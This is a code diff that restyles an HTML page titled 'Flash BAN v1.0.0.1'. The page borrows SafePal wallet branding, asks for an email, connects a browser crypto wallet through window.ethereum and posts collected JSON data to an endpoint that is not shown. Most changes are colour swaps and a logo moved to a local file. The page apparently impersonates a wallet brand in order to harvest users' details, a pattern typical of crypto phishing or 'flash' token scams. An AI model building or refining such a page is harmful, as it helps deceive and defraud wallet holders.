@@ -8,8 +8,8 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: white;
-            color: rgb(255, 0, 19);
+            background-color: rgb(72, 32, 232);
+            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,9 +22,10 @@
             border-radius: 12px;
             text-align: center;
             background: white;
-            box-shadow: 0px 0px 15px rgba(255, 0, 19, 0.5);
-            border: 2px solid rgb(255, 0, 19);
+            box-shadow: 0px 0px 15px rgba(72, 32, 232, 0.5);
+            border: 2px solid rgb(72, 32, 232);
             position: relative;
+            color: rgb(72, 32, 232);
         }
         .wallet-logo {
             width: 80px;
@@ -35,7 +36,7 @@
             margin-bottom: 15px;
             width: calc(100% - 24px);
             border-radius: 6px;
-            border: 1px solid rgb(255, 0, 19);
+            border: 1px solid rgb(72, 32, 232);
             outline: none;
             display: block;
             margin-left: auto;
@@ -48,31 +49,31 @@
             border: none;
             cursor: pointer;
             font-size: 16px;
-            background-color: rgb(255, 0, 19);
+            background-color: rgb(72, 32, 232);
             color: white;
             transition: background 0.3s ease;
         }
         button:hover {
             background-color: white;
-            color: rgb(255, 0, 19);
-            border: 2px solid rgb(255, 0, 19);
+            color: rgb(72, 32, 232);
+            border: 2px solid rgb(72, 32, 232);
         }
         #statusMessage {
             margin-top: 20px;
             font-size: 14px;
-            color: rgb(255, 0, 19);
+            color: rgb(72, 32, 232);
         }
         #walletAddress {
             margin-top: 20px;
             font-size: 16px;
             font-weight: bold;
-            color: rgb(255, 0, 19);
+            color: rgb(72, 32, 232);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/SafePal_Logo.svg/512px-SafePal_Logo.svg.png" alt="SafePal Logo" class="wallet-logo">
+        <img src="./safepal.png" alt="SafePal Logo" class="wallet-logo">
         <h1>Flash BAN v1.0.0.1</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT</button>
@@ -88,7 +89,7 @@
             if (isConnecting) return;
             isConnecting = true;
             document.getElementById('connectButton').textContent = 'Connecting...';
-            document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 165, 0)';
+            document.getElementById('connectButton').style.backgroundColor = 'rgb(150, 100, 255)';
 
             if (window.ethereum) {
                 try {
@@ -112,11 +113,10 @@
                         },
                         body: jsonData
                     });
-
                 } catch (error) {
                     document.getElementById('statusMessage').textContent = "Wallet connection failed.";
                     document.getElementById('connectButton').textContent = 'Connect Wallet';
-                    document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 0, 19)';
+                    document.getElementById('connectButton').style.backgroundColor = 'rgb(72, 32, 232)';
                 }
             } else {
                 document.getElementById('statusMessage').textContent = "SafePal Wallet or MetaMask is not installed!";
